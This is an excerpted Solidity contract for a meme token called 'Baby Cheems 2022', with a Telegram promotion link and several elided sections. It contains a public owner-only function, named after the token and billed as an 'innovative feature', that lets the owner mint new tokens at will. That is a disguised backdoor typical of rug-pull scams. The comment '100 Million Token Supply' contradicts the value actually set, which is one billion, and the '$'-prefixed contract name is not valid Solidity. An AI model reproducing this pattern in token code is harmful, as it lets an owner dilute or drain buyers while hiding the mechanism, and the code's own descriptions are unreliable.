...
//
// $BabyCheems2022 proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/babycheems2022
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Babycheems2022(uint256 amount) public onlyOwner {
 _Babycheems2022(msg.sender, amount);
    }
    ...
    function _Babycheems2022(address account, uint256 amount) internal virtual {
...
contract $BabyCheems2022 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Cheems 2022", "BABYCHEEMS2022") {
        _Babycheems2022(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}